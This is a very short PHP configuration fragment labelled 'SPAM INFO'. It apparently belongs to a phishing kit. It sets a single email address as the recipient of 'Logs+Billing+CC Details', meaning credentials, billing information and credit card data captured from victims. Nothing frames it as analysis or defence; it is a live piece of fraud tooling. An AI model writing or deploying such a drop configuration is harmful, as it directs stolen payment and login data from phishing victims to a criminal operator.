<?php

// SPAM INFO

$to = "admazer@yandex.com"; // Logs+Billing+CC Details

?>